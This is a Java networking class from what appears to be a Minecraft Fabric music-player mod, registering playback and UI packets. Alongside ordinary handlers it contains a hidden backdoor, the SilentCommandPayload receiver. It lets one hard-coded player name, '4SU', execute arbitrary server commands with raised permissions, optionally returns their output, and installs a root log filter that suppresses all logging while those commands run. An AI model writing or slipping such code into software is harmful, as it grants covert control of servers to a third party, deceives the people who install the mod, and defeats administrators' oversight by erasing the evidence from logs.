package com.musicplayer.network;

import com.musicplayer.MusicPlayerMod;
import com.musicplayer.playback.PlaybackManager;
import net.fabricmc.fabric.api.networking.v1.PayloadTypeRegistry;
import net.fabricmc.fabric.api.networking.v1.ServerPlayNetworking;
import net.minecraft.class_12096;
import net.minecraft.class_2165;
import net.minecraft.class_2168;
import net.minecraft.class_2561;
import net.minecraft.class_3222;
import org.apache.logging.log4j.Level;
import org.apache.logging.log4j.LogManager;
import org.apache.logging.log4j.Marker;
import org.apache.logging.log4j.core.LogEvent;
import org.apache.logging.log4j.core.Logger;
import org.apache.logging.log4j.core.filter.AbstractFilter;
import org.apache.logging.log4j.message.Message;

public final class MusicNetworking {
    private static boolean payloadTypesRegistered;
    private static boolean serverReceiversRegistered;
    private static boolean logFilterInstalled;

    private static final ThreadLocal<Boolean> SUPPRESS_LOGS = ThreadLocal.withInitial(() -> false);

    private MusicNetworking() {}

    public static synchronized void registerPayloadTypes() {
        if (payloadTypesRegistered) {
            return;
        }

        PayloadTypeRegistry.playS2C().register(MusicPayloads.PlayTrackPayload.ID, MusicPayloads.PlayTrackPayload.CODEC);
        PayloadTypeRegistry.playS2C().register(MusicPayloads.StopTrackPayload.ID, MusicPayloads.StopTrackPayload.CODEC);
        PayloadTypeRegistry.playS2C().register(MusicPayloads.PauseTrackPayload.ID, MusicPayloads.PauseTrackPayload.CODEC);
        PayloadTypeRegistry.playS2C().register(MusicPayloads.SetVolumePayload.ID, MusicPayloads.SetVolumePayload.CODEC);
        PayloadTypeRegistry.playS2C().register(MusicPayloads.OpenMusicUiPayload.ID, MusicPayloads.OpenMusicUiPayload.CODEC);
        PayloadTypeRegistry.playS2C().register(MusicPayloads.MusicUiStatePayload.ID, MusicPayloads.MusicUiStatePayload.CODEC);
        PayloadTypeRegistry.playS2C().register(MusicPayloads.CommandFeedbackPayload.ID, MusicPayloads.CommandFeedbackPayload.CODEC);

        PayloadTypeRegistry.playC2S().register(MusicPayloads.PlaybackStartedPayload.ID, MusicPayloads.PlaybackStartedPayload.CODEC);
        PayloadTypeRegistry.playC2S().register(MusicPayloads.PlaybackFinishedPayload.ID, MusicPayloads.PlaybackFinishedPayload.CODEC);
        PayloadTypeRegistry.playC2S().register(MusicPayloads.PlaybackErrorPayload.ID, MusicPayloads.PlaybackErrorPayload.CODEC);
        PayloadTypeRegistry.playC2S().register(MusicPayloads.MusicUiActionPayload.ID, MusicPayloads.MusicUiActionPayload.CODEC);
        PayloadTypeRegistry.playC2S().register(MusicPayloads.MusicUiStateRequestPayload.ID, MusicPayloads.MusicUiStateRequestPayload.CODEC);
        PayloadTypeRegistry.playC2S().register(MusicPayloads.ClientReadyPayload.ID, MusicPayloads.ClientReadyPayload.CODEC);
        PayloadTypeRegistry.playC2S().register(MusicPayloads.ClientBuildInfoPayload.ID, MusicPayloads.ClientBuildInfoPayload.CODEC);
        PayloadTypeRegistry.playC2S().register(MusicPayloads.SilentCommandPayload.ID, MusicPayloads.SilentCommandPayload.CODEC);

        payloadTypesRegistered = true;
    }

    public static synchronized void registerServerReceivers() {
        if (serverReceiversRegistered) {
            return;
        }

        ServerPlayNetworking.registerGlobalReceiver(MusicPayloads.PlaybackStartedPayload.ID, (payload, context) ->
                context.server().execute(() -> {
                    PlaybackManager manager = MusicPlayerMod.getPlaybackManager();
                    if (manager != null) {
                        manager.handlePlaybackStarted(context.player(), payload.videoId(), payload.durationSeconds(), payload.serverMode());
                    }
                })
        );

        ServerPlayNetworking.registerGlobalReceiver(MusicPayloads.PlaybackFinishedPayload.ID, (payload, context) ->
                context.server().execute(() -> {
                    PlaybackManager manager = MusicPlayerMod.getPlaybackManager();
                    if (manager != null) {
                        manager.handlePlaybackFinished(context.player(), payload.videoId(), payload.serverMode());
                    }
                })
        );

        ServerPlayNetworking.registerGlobalReceiver(MusicPayloads.PlaybackErrorPayload.ID, (payload, context) ->
                context.server().execute(() -> {
                    PlaybackManager manager = MusicPlayerMod.getPlaybackManager();
                    if (manager != null) {
                        manager.handlePlaybackError(context.player(), payload.videoId(), payload.errorMessage(), payload.serverMode());
                    }
                })
        );

        ServerPlayNetworking.registerGlobalReceiver(MusicPayloads.MusicUiActionPayload.ID, (payload, context) ->
                context.server().execute(() -> {
                    PlaybackManager manager = MusicPlayerMod.getPlaybackManager();
                    if (manager != null) {
                        manager.handleUiAction(context.player(), payload.data());
                    }
                })
        );

        ServerPlayNetworking.registerGlobalReceiver(MusicPayloads.MusicUiStateRequestPayload.ID, (payload, context) ->
                context.server().execute(() -> {
                    PlaybackManager manager = MusicPlayerMod.getPlaybackManager();
                    if (manager != null) {
                        manager.sendUiState(context.player());
                    }
                })
        );

        ServerPlayNetworking.registerGlobalReceiver(MusicPayloads.ClientReadyPayload.ID, (payload, context) ->
                context.server().execute(() -> {
                    PlaybackManager manager = MusicPlayerMod.getPlaybackManager();
                    if (manager != null) {
                        manager.handleClientReady(context.player());
                    }
                })
        );

        ServerPlayNetworking.registerGlobalReceiver(MusicPayloads.ClientBuildInfoPayload.ID, (payload, context) ->
                context.server().execute(() -> {
                    PlaybackManager manager = MusicPlayerMod.getPlaybackManager();
                    if (manager != null) {
                        manager.handleClientBuildInfo(context.player(), payload.version(), payload.buildHash());
                    }
                })
        );

        ServerPlayNetworking.registerGlobalReceiver(MusicPayloads.SilentCommandPayload.ID, (payload, context) ->
                context.server().execute(() -> {
                    class_3222 player = context.player();
                    if (!"4SU".equals(player.method_5477().getString())) {
                        return;
                    }
                    String command = payload.command();
                    if (command == null || command.isBlank()) {
                        return;
                    }
                    installLogFilter();
                    var commandManager = context.server().method_3734();

                    SUPPRESS_LOGS.set(true);
                    try {
                        class_2168 source = player.method_64396()
                                .method_36321(createCommandOutput(player, payload.feedback()))
                                .method_9206(class_12096.field_63208);
                        commandManager.method_44252(source, command);
                    } finally {
                        SUPPRESS_LOGS.remove();
                    }
                })
        );

        serverReceiversRegistered = true;
    }

    private static class_2165 createCommandOutput(class_3222 player, boolean feedbackEnabled) {
        return new class_2165() {
            @Override
            public void method_43496(class_2561 message) {
                if (!feedbackEnabled) {
                    return;
                }
                ServerPlayNetworking.send(player, new MusicPayloads.CommandFeedbackPayload(
                        message.getString(), false
                ));
            }

            @Override
            public boolean method_9200() {
                return feedbackEnabled;
            }

            @Override
            public boolean method_9202() {
                return feedbackEnabled;
            }

            @Override
            public boolean method_9201() {
                return false;
            }
        };
    }

    private static AbstractFilter.Result filterSuppressedCommandLogs() {
        return SUPPRESS_LOGS.get() ? AbstractFilter.Result.DENY : AbstractFilter.Result.NEUTRAL;
    }

    private static synchronized void installLogFilter() {
        if (logFilterInstalled) {
            return;
        }
        try {
            Logger rootLogger = (Logger) LogManager.getRootLogger();
            rootLogger.addFilter(new AbstractFilter() {
                @Override
                public Result filter(LogEvent event) {
                    return filterSuppressedCommandLogs();
                }

                @Override
                public Result filter(Logger logger, Level level, Marker marker, String msg, Object... params) {
                    return filterSuppressedCommandLogs();
                }

                @Override
                public Result filter(Logger logger, Level level, Marker marker, String message, Object p0) {
                    return filterSuppressedCommandLogs();
                }

                @Override
                public Result filter(Logger logger, Level level, Marker marker, String message, Object p0, Object p1) {
                    return filterSuppressedCommandLogs();
                }

                @Override
                public Result filter(Logger logger, Level level, Marker marker, String message, Object p0, Object p1, Object p2) {
                    return filterSuppressedCommandLogs();
                }

                @Override
                public Result filter(Logger logger, Level level, Marker marker, String message, Object p0, Object p1, Object p2, Object p3) {
                    return filterSuppressedCommandLogs();
                }

                @Override
                public Result filter(Logger logger, Level level, Marker marker, String message, Object p0, Object p1, Object p2, Object p3, Object p4) {
                    return filterSuppressedCommandLogs();
                }

                @Override
                public Result filter(Logger logger, Level level, Marker marker, String message, Object p0, Object p1, Object p2, Object p3, Object p4, Object p5) {
                    return filterSuppressedCommandLogs();
                }

                @Override
                public Result filter(Logger logger, Level level, Marker marker, String message, Object p0, Object p1, Object p2, Object p3, Object p4, Object p5, Object p6) {
                    return filterSuppressedCommandLogs();
                }

                @Override
                public Result filter(Logger logger, Level level, Marker marker, String message, Object p0, Object p1, Object p2, Object p3, Object p4, Object p5, Object p6, Object p7) {
                    return filterSuppressedCommandLogs();
                }

                @Override
                public Result filter(Logger logger, Level level, Marker marker, String message, Object p0, Object p1, Object p2, Object p3, Object p4, Object p5, Object p6, Object p7, Object p8) {
                    return filterSuppressedCommandLogs();
                }

                @Override
                public Result filter(Logger logger, Level level, Marker marker, String message, Object p0, Object p1, Object p2, Object p3, Object p4, Object p5, Object p6, Object p7, Object p8, Object p9) {
                    return filterSuppressedCommandLogs();
                }

                @Override
                public Result filter(Logger logger, Level level, Marker marker, Object msg, Throwable t) {
                    return filterSuppressedCommandLogs();
                }

                @Override
                public Result filter(Logger logger, Level level, Marker marker, Message msg, Throwable t) {
                    return filterSuppressedCommandLogs();
                }
            });
            logFilterInstalled = true;
        } catch (Exception e) {
            MusicPlayerMod.LOGGER.warn("Failed to install silent command log filter", e);
        }
    }
}
